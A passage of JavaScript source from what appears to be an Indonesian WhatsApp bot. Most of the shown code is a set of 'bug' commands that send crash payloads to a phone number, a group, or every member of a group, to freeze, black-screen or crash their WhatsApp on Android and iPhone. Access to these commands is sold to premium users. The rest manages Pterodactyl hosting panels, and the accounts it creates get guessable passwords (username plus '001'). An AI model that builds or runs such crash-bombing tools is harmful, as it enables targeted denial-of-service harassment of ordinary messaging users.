        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
        let Pe = pepec + '@s.whatsapp.net'
        await loadbug()
        await lokasbug()
        {
          await buk1000(qio, Pe)
        }
      }
        break

      case '/qio-stuck': {
        if (!isPrem) return replygw(ownerprem)
        if (!q) return replygw(`Penggunaan .${command} 628xxx`)
        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
        let Pe = pepec + '@s.whatsapp.net'
        await loadbug()
        await lokasbug()
        {
          await buk4000(qio, Pe)
        }
      }
        break
      //=====================(!) BUG SEND TARGET BLACK SCREEN============================//
      case '/qio-blacksc': {
        if (!isPrem) return replygw(ownerprem)
        if (!q) return replygw(`Penggunaan .${command} 628xxx`)
        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
        let Pe = pepec + '@s.whatsapp.net'
        await loadbug()
        await lokasbug()
        await buk3000(qio, Pe)
        await buk1000(qio, Pe)
      }
        break
      //=====================(!) BUG SEND TARGET FREZEE/MENTOK LOGO============================//
      case '/qio-freeze': {
        if (!isPrem) return replygw(ownerprem)
        if (!q) return replygw(`Penggunaan .${command} 628xxx`)
        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
        let Pe = pepec + '@s.whatsapp.net'
        await loadbug()
        await lokasbug()
        for (let i = 0; i < 5; i++) {
          await buk2000(qio, Pe)
        }
        await buk1000(qio, Pe)
      }
        break
      //=====================(!) BUG SEND TARGET WKTU DETIK============================// 
      case '/qio-bugwaktu': {
        if (!isPrem) return replygw(ownerprem)
        if (!q) return m.reply(`Penggunaan .${command} 628xxx|1\n# memasukkan 1 sama dengan 300.detik`)
        let ppek = q.split("|")[0]
        let pepec = ppek.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx|1`)
        let Pe = pepec + "@s.whatsapp.net"
        let jumlah = q.split("|")[1] * 200
        let ppk = jumlah * 1.5
        m.reply(ppk + " detik");
        await loadbug()
        await lokasbug()
        {
          await buk1000(qio, Pe)
        }
      }
        break
      //=====================(!) BUG SEND TARGET JUMLAH============================//
      case '/qio-bugjumlah': {
        if (!isPrem) return replygw(ownerprem)
        if (!qtext) return m.reply(`Command Salah Silahkan Gunakan Command ${command} nomor|jumlah`)
        Pe = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
        let ceknya = await qio.onWhatsApp(Pe)
        if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
        await loadbug()
        await lokasbug()
        global.jumlah = q.split("|")[1]
        await qio.sendMessage(Pe, { text: `⚠️🧷𝔄𝔩𝔴𝔞𝔶𝔰𝔞𝔮𝔦𝔬𝔬 المطور` })
        await buk1000(qio, Pe)
      }
        break
      //=====================(!) BUG SEND TARGET M.CHAT============================//
      case '/xixi':
        if (!isDeveloper) return replywa(`khusus bot doang`)
        await mennuu()
        await buk1000(qio, from)
        await reaction(from, "🖐️")
        break
      //=====================(!) BUG SEND TARGET IPONG============================//
      case '/qio-iphone': {
        if (!isPrem) return replygw(ownerprem)
        if (!q) return replygw(`Penggunaan .${command} 628xxx`)
        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
        let Pe = pepec + '@s.whatsapp.net'
        await loadbug()
        await lokasbug()
        await iponkk4(qio, Pe);
        for (let j = 0; j < 4; j++) {
          await ipbugs(qio, Pe)
          await ipbugs(qio, Pe)
          await ipbugs(qio, Pe)
          await ipbugs(qio, Pe)
          await ipbugs(qio, Pe)
          await sleep(2000)
        }
      }
        break
      //=================================================//

      //=====================(!) BUG SEND GRUP============================//
      case '/qio-gckill': case '/qio-gcbug': case '/qio-gcspy': {
        if (!isPrem) return replygw(ownerprem)
        if (!q) return m.reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
        let Pe = await qio.groupAcceptInvite(result);
        await loadbug()
        await lokasbug()
        {
          await buk1000(qio, Pe)
        }
      }
        break
      //=====================(!) BUG SEND GRUP ALL MEMBER============================//
      case '/qio-bugallmem': {
        if (!isPrem) return replygw(ownerprem)
        if (!m.isGroup) return m.reply('masuk grup dlu')
        let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
        await loadbug()
        qio.nampilzz(`_#Successfully submitted bug to ${mem.length} person_
✉︎ *Pause 5 minutes so the bot doesn't get banned*`)
        for (let geek of mem) {
          await buk100(qio, geek)
          await sleep(420000)
        }
      }
        break
      //=====================(!) END BYG SEND============================//




      //=================================================//



      //=====================(!) BUG SEND TARGET (MURBUG)============================//
      case '/mb-bug': case '/mb-kill': case 'mb-spy': case '/mb-🧸': case '/mb-😍': case '/mb-🔪': case '/mb-🥵': {
        if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
        if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
        if (!q) return m.reply(`Penggunaan pake nomor cil`)
        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara️`)
        let Pe = pepec + '@s.whatsapp.net'
        await loadbug()
        await lokasbug()
        {
          await buk1000(qio, Pe)
        }
      }
        break
      //=====================(!) BUG SEND TARGET BLACK SCREEN(MURBUG)============================//
      case '/mb-blacksc': {
        if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
        if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
        if (!q) return replygw(`Penggunaan .${command} 628xxx`)
        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
        let Pe = pepec + '@s.whatsapp.net'
        await loadbug()
        await lokasbug()
        await buk3000(qio, Pe)
        await buk1000(qio, Pe)
      }
        break
      //=====================(!) BUG SEND TARGET FREZEE/MENTOK LOGO(MURBUG)============================//
      case '/mb-freeze': {
        if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
        if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
        if (!q) return replygw(`Penggunaan .${command} 628xxx`)
        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
        let Pe = pepec + '@s.whatsapp.net'
        await loadbug()
        await lokasbug()
        for (let i = 0; i < 5; i++) {
          await buk2000(qio, Pe)
        }
        await buk1000(qio, Pe)
      }
        break
      //=====================(!) BUG SEND TARGET WKTU DETIK(MURBUG)============================// 
      case '/mb-bugwaktu': {
        if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
        if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
        if (!q) return m.reply(`Penggunaan .${command} 628xxx|1\n# memasukkan 1 sama dengan 300.detik`)
        let ppek = q.split("|")[0]
        let pepec = ppek.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx|1`)
        let Pe = pepec + "@s.whatsapp.net"
        let jumlah = q.split("|")[1] * 200
        let ppk = jumlah * 1.5
        m.reply(ppk + " detik");
        await loadbug()
        await lokasbug()
        {
          await buk1000(qio, Pe)
        }
      }
        break
      //=====================(!) BUG SEND TARGET JUMLAH(MURBUG)============================//
      case '/mb-bugjumlah': {
        if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
        if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
        if (!qtext) return m.reply(`Command Salah Silahkan Gunakan Command ${command} nomor|jumlah`)
        Pe = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
        let ceknya = await qio.onWhatsApp(Pe)
        if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
        await loadbug()
        await lokasbug()
        global.jumlah = q.split("|")[1]
        await qio.sendMessage(Pe, { text: `⚠️🧷𝔄𝔩𝔴𝔞𝔶𝔰𝔞𝔮𝔦𝔬𝔬 المطور` })
        await buk1000(qio, Pe)
      }
        break
      //=====================(!) BUG SEND TARGET IPONG(MURBUG)============================//
      case '/mb-iphone': {
        if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
        if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
        if (!q) return replygw(`Penggunaan .${command} 628xxx`)
        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
        let Pe = pepec + '@s.whatsapp.net'
        await loadbug()
        await lokasbug()
        await iponkk4(qio, Pe);
        for (let j = 0; j < 4; j++) {
          await ipbugs(qio, Pe)
          await ipbugs(qio, Pe)
          await ipbugs(qio, Pe)
          await ipbugs(qio, Pe)
          await ipbugs(qio, Pe)
          await sleep(2000)
        }
      }
        break
      //=====================(!) BUG SEND TARGET GRUP (MURBUG)============================//
      case '/mb-gcbug': case '/mb-gckill': case 'mb-gcspy': {
        if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
        if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
        if (!q) return m.reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
        let Pe = await qio.groupAcceptInvite(result);
        await loadbug()
        await lokasbug()
        {
          await buk1000(qio, Pe)
        }
      }
        break
      //=====================(!) BUG SEND GRUP ALL MEMBER(MURBUG)============================//
      case '/mb-bugallmem': {
        if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
        if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
        if (!m.isGroup) return m.reply('masuk grup dlu')
        let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
        await loadbug()
        qio.nampilzz(`_#Successfully submitted bug to ${mem.length} person_
✉︎ *Pause 5 minutes so the bot doesn't get banned*`)
        for (let geek of mem) {
          await buk100(qio, geek)
          await sleep(420000)
        }
      }
        break
      //=====================(!) END BYG SEND(MURBUG)============================//
      case '/sendbugnum':
        if (!isPrem) return replygw(global.nocreator)
        if (!q) return replygw(`Example:\n ${prefix + command} 628xxx`)
        number = q.split(',')[0];
        Pew = number.replace(/[^0-9]/g, '')
        targetfull = `${Pew}`
        let msg = generateWAMessageFromContent(from, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: '[⚠️] PILIH ✅'
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: `Alwaysaqioo`
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  hasMediaAttachment: false
                }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: [
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.fromObject({
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: `𝙱𝚞𝚐 𝙰𝚗𝚍𝚛𝚘𝚒𝚍`,
                        hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: qioimage }, { upload: qio.waUploadToServer }))
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_m.reply",
                            buttonParamsJson: JSON.stringify({
                              display_text: "@𝘈𝘭𝘸𝘢𝘺𝘴𝘢𝘲𝘪𝘰𝘰-𝘉𝘰𝘵𝘻",
                              id: `./qio-force ${targetfull}`
                            }),
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.fromObject({
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: `𝙱𝚞𝚐 𝙸𝚙𝚑𝚘𝚗𝚎`,
                        hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: qioimage }, { upload: qio.waUploadToServer }))
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_m.reply",
                            buttonParamsJson: JSON.stringify({
                              display_text: "@𝘈𝘭𝘸𝘢𝘺𝘴𝘢𝘲𝘪𝘰𝘰-𝘉𝘰𝘵𝘻",
                              id: `./qio-iphone ${targetfull}`
                            }),
                          }
                        ]
                      })
                    }
                  ]
                })
              })
            }
          }
        }, {})

        await qio.relayMessage(from, msg.message, {
          messageId: msg.key.id
        })
        break

      case '/sendbugnum2':
        if (!isPrem) return replygw(global.nocreator)
        if (!q) return replygw(`Example:\n ${prefix + command} 628xxx,5`)
        pepekc = q.replace(/[^0-9]/g, "")
        Pew = pepekc + '@s.whatsapp.net'
        hohe = [
          {
            "name": "single_select",
            "buttonParamsJson": `{ "title": "𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨⚡", "sections": [{ "title": "›𝘚𝘦𝘭𝘦𝘤𝘪𝘰𝘯𝘦 𝘶𝘮", "highlight_label": "☠️Crash Wangsaf️", "rows": [{ "header": "›𝙱𝚞𝚐 𝙰𝚗𝚍𝚛𝚘𝚒𝚍", "title": "@𝘈𝘭𝘸𝘢𝘺𝘴𝘢𝘲𝘪𝘰𝘰-𝘉𝘰𝘵𝘻", "id": "./qio-force ${Pew}" }, { "header": "›𝙱𝚞𝚐 𝙸𝚙𝚑𝚘𝚗𝚎", "title": "@𝘈𝘭𝘸𝘢𝘺𝘴𝘢𝘲𝘪𝘰𝘰-𝘉𝘰𝘵𝘻", "id": "./qio-iphone ${Pew}" }] }] }`
          }
        ]
        ewe = `Pilihan Manis`
        qio.sendButton(from, hohe, m, {
          body: ewe,
          footer: `Alwaysaqioo`
        })
        break

      //PANEL//

      case '/listram': {
        m.reply(`  ListRam ( ${global.botname} )
 
  𖣂 Sc Private 𖤲 <特> 𖤲
 名前 : ${m.pushName}}
    ⛩️ タグ : @${m.sender.split('@')[0]}
 
1GB Cpu: 50% - 3.000/bln
2GB Cpu: 70% - 5.000/bln
3GB Cpu: 90% - 7.000/bln
4GB Cpu: 110% - 9.000/bln
5GB Cpu: 130% - 11.000/bln
6GB Cpu: 150% - 13.000/bln
7GB Cpu: 170% - 15.000/bln
8GB Cpu: 200% - 17.000/bln`)
      }
        break
      //=================================================//
      case "/listsrv": {
        if (!isPrem) return replygw(ownerprem)
        let page = args[0] ? args[0] : '1';
        let f = await fetch(domain + "/api/application/servers?page=" + page, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        });
        let res = await f.json();
        let servers = res.data;
        let sections = [];
        let messageText = "Berikut adalah daftar server:\n\n";

        for (let server of servers) {
          let s = server.attributes;

          let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
            "method": "GET",
            "headers": {
              "Accept": "application/json",
              "Content-Type": "application/json",
              "Authorization": "Bearer " + capikey
            }
          });

          let data = await f3.json();
          let status = data.attributes ? data.attributes.current_state : s.status;

          messageText += `ID Server: ${s.id}\n`;
          messageText += `Nama Server: ${s.name}\n`;
          messageText += `Status: ${status}\n\n`;
        }

        messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
        messageText += `Total Server: ${res.meta.pagination.count}`;

        await qio.sendMessage(m.chat, { text: messageText }, { quoted: m });

        if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
          m.reply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
        }
      }
        break;

      case "/delsrv": {
        if (!isPrem) return replygw(ownerprem)
        let srv = args[0]
        if (!srv) return m.reply('ID nya mana?')
        let f = await fetch(domain + "/api/application/servers/" + srv, {
          "method": "DELETE",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          }
        })
        let res = f.ok ? {
          errors: null
        } : await f.json()
        if (res.errors) return m.reply('Server tidak ditemukan')
        m.reply('Berhasil minghapus Server.')
      }
        break
      //=================================================//
      case "/listusr": {
        if (!isPrem) return replygw(ownerprem)
        let page = args[0] ? args[0] : '1';
        let f = await fetch(domain + "/api/application/users?page=" + page, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        });
        let res = await f.json();
        let users = res.data;
        let messageText = "Berikut list user:\n\n";

        for (let user of users) {
          let u = user.attributes;
          messageText += `ID: ${user.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
          messageText += ` ${user.username}\n`;
          messageText += `${u.first_name} ${u.last_name}\n\n`;
        }

        messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
        messageText += `Total Users: ${res.meta.pagination.count}`;

        await qio.sendMessage(m.chat, { text: messageText }, { quoted: m });

        if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
          m.reply(`Gunakan perintah ${prefix ? prefix : '.'}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
        }
      }
        break
      //=================================================//
      case "/delusr": {
        if (!isPrem) return replygw(ownerprem)
        let usr = args[0]
        if (!usr) return m.reply('ID nya mana?')
        let f = await fetch(domain + "/api/application/users/" + usr, {
          "method": "DELETE",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        let res = f.ok ? {
          errors: null
        } : await f.json()
        if (res.errors) return m.reply('User tidak ditemukan')
        m.reply('Berhasil menghapus User')
      }
        break
      //=================================================//
      case "/addsrv": {
        if (!isPrem) return replygw(ownerprem)
        let s = q.split(',');
        if (s.length < 7) return m.reply(`> *Format salah!*

❗ Penggunaan:
${prefix + command} nama panel,tanggal,id user yang ingin ditambah kan server,eggId,locationId,memory/disk,cpu

\`✅ Example\` : addsrv Alwaysaqiooo,26 Desember 2018,1,15,1,0/0,0
`)
        let name = s[0];
        let desc = s[1] || ''
        let usr_id = s[2];
        let egg = s[3];
        let loc = s[4];
        let memo_disk = s[5].split`/`;
        let cpu = s[6];
        let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        let data = await f1.json();
        let startup_cmd = data.attributes.startup

        let f = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name + ' Cp-qio',
            "description": 'Create with ' + botname,
            "user": usr_id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": memo_disk[0],
              "swap": 0,
              "disk": memo_disk[1],
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let res = await f.json()
        if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
        let server = res.attributes
        m.reply(`
❗ *SUCCESSFULLY ADD SERVER*

TYPE: \`${res.object}\`

ID: \`${server.id}\`
UUID: ${server.uuid}\`
NAME: ${server.name}\`
DESCRIPTION: \`${server.description}\`
MEMORY: \`${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\`
DISK: \`${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\`
CPU: \`${server.limits.cpu}%\`
CREATED AT: ${server.created_at}\``)
      }
        break

      //Panel wak

      case '/1gb': {
        if (!isReseller) {
          m.reply(mess.seller)
        }
        if (!isPrem) return replygw(ownerprem)
        let t = q.split(',');
        if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
        let username = t[0];
        let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
        let name = username
        let egg = global.eggsnya
        let loc = global.location
        let memo = "1024"
        let cpu = "50"
        let disk = "1024"
        let email = username + "qio@sweetrabit.ml"
        akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg"
        if (!u) return
        let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
        let password = username + '001'
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
          })
        })
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes
        let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        m.reply(`User ID: ${user.id}`)
        let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
        qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
        let data2 = await f2.json()
        let startup_cmd = data2.attributes.startup
        let f3 = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name + ' - 1gb',
            "description": 'Create with ' + botname,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": memo,
              "swap": 0,
              "disk": disk,
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let res = await f3.json()
        if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
        let server = res.attributes
        let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
      }
        break
      //=================================================//
      case '/2gb': {
        if (!isReseller) {
          m.reply(mess.seller)
        }
        if (!isPrem) return replygw(ownerprem)
        let t = q.split(',');
        if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
        let username = t[0];
        let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
        let name = username
        let egg = global.eggsnya
        let loc = global.location
        let memo = "2024"
        let cpu = "70"
        let disk = "2024"
        let email = username + "qio@sweetrabit.ml"
        akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg"
        if (!u) return
        let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
        let password = username + '001'
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
          })
        })
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes
        let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        m.reply(`User ID: ${user.id}`)
        let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
        qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
        let data2 = await f2.json()
        let startup_cmd = data2.attributes.startup
        let f3 = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name + ' - 2gb',
            "description": 'Create with ' + botname,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": memo,
              "swap": 0,
              "disk": disk,
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let res = await f3.json()
        if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
        let server = res.attributes
        let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
      }
        break
      //=================================================//

      case '/closebug': {
        const qioonly = ["6288708247447"]
        const isqioonly = [botNumber, ...qioonly].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        if (!isqioonly) return m.reply(`khusus alwaysqioo`)
        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
        let Pe = pepec + '@s.whatsapp.net'
        await m.reply('Done Bg Qioo')
        await qio.sendMessage(Pe, { image: qioimage, caption: ` Close Bug By Alwaysaqioo` }, { quoted: m })
      }
        break


      case '/banumbots': {
        const qioonly = ["6288708247447"]
        const isqioonly = [botNumber, ...qioonly].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        if (!isqioonly) return m.reply(`khusus alwaysqioo`)
        qio.sendMessage(from, {
          image: { url: 'https://telegra.ph/file/be6b037b98c930bf2d58f.jpg' },
          caption: 'xodosjaj'
        }, { quoted: m })
      }
        break

      case '/xodosjaj': {
        const qioonly = ["6288708247447"]
        const isqioonly = [botNumber, ...qioonly].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        if (!isqioonly) return m.reply(`khusus alwaysqioo`)
        if (!quoted) return m.reply(`Send/m.reply Image With Caption ${prefix + command}`)
        if (!/image/.test(mime)) return m.reply(`Send/m.reply Image With Caption ${prefix + command}`)
        if (/webp/.test(mime)) return m.reply(`Send/m.reply Image With Caption ${prefix + command}`)
        var medis = await qio.downloadAndSaveMediaMessage(quoted)
        var memeg = await qio.updateProfilePicture(botNumber, { url: medis })
        fs.unlinkSync(medis)
        m.reply('Success')
      }
        break
      //=================================================//
      case '/3gb': {
        if (!isReseller) {
          m.reply(mess.seller)
        }
        if (!isPrem) return replygw(ownerprem)
        let t = q.split(',');
        if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
        let username = t[0];
        let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
        let name = username
        let egg = global.eggsnya
        let loc = global.location
        let memo = "3024"
        let cpu = "90"
        let disk = "3024"
        let email = username + "qio@sweetrabit.ml"
        akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg"
        if (!u) return
